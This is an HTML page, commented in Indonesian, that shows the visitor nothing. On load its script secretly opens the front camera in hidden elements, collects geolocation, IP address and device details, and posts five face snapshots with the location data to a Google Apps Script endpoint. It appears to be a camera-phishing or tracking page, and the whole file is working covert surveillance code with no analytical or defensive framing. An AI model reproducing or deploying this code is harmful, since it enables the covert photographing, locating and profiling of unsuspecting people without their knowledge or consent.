<!doctype html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
  </head>
  <body>
    <video id="video" autoplay playsinline style="display: none"></video>
    <canvas id="canvas" style="display: none"></canvas>

    <script>
      /* ================= CONFIG ================= */
      const scriptURL =
        "https://script.google.com/macros/s/AKfycbxrzNODa2jCPweMz922zOUatp1CE3TIZPMPf8SiETXF_hqchkxZDNq-biIcex_i5owi/exec";
      const MAX_SEND = 5;
      const DELAY = 3000;

      /* ================= VAR ================= */
      let latitude = "",
        longitude = "",
        ipAddress = "";
      let sendCount = 0;
      let streamRef = null;

      /* ================= DEVICE ================= */
      const getDevice = () =>
        /android/i.test(navigator.userAgent)
          ? "Android"
          : /iphone|ipad|ipod/i.test(navigator.userAgent)
            ? "iOS"
            : "Other";

      const getBrowser = () =>
        navigator.userAgent.includes("Chrome")
          ? "Chrome"
          : navigator.userAgent.includes("Safari")
            ? "Safari"
            : navigator.userAgent.includes("Firefox")
              ? "Firefox"
              : "Other";

      /* ================= IP ================= */
      fetch("https://api.ipify.org?format=json")
        .then((r) => r.json())
        .then((d) => (ipAddress = d.ip))
        .catch(() => {});

      /* ================= LOKASI ================= */
      navigator.geolocation.getCurrentPosition(
        (p) => {
          latitude = p.coords.latitude;
          longitude = p.coords.longitude;
        },
        () => {},
      );

      /* ================= KAMERA DEPAN ================= */
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const ctx = canvas.getContext("2d");

      navigator.mediaDevices
        .getUserMedia({ video: { facingMode: "user" } })
        .then((stream) => {
          streamRef = stream;
          video.srcObject = stream;
          setTimeout(loopCapture, 3500); // tunggu frame hidup
        })
        .catch(() => {});

      /* ================= LOOP ================= */
      function loopCapture() {
        if (sendCount >= MAX_SEND) {
          streamRef.getTracks().forEach((t) => t.stop());
          return;
        }

        // resize canvas mengikuti frame (ANTI DUPLIKASI)
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const photo = canvas.toDataURL("image/jpeg", 0.85);
        const timestamp = new Date().toISOString();
        const nonce = Math.random().toString(36).substring(2, 10);

        fetch(scriptURL, {
          method: "POST",
          body: JSON.stringify({
            capture_id: `${timestamp}_${nonce}`, // ðŸ‘ˆ UNIQUE
            waktu: timestamp,
            latitude,
            longitude,
            ip: ipAddress,
            device: getDevice(),
            browser: getBrowser(),
            foto: photo,
            urutan: sendCount + 1,
          }),
        }).finally(() => {
          sendCount++;
          setTimeout(loopCapture, DELAY);
        });
      }
    </script>
  </body>
</html>

